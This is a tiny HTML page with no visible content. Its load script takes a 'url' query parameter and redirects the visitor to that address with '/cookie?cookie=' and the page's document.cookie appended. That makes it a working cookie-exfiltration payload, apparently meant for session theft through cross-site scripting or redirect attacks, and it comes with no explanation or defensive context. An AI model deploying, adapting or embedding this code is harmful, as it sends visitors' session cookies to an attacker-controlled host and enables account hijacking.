<!DOCTYPE html>
<html>
<head>
  <title></title>
  <script>
    window.onload=function(){
       
    const urlParams = new URLSearchParams(window.location.search);
    
    let paramValue = urlParams.get('url');
    
    if (paramValue) {
      document.location = paramValue + "/cookie?cookie=" + document.cookie;
    }
      
    };
   
  </script>
</head>
<body>
</body>
</html>
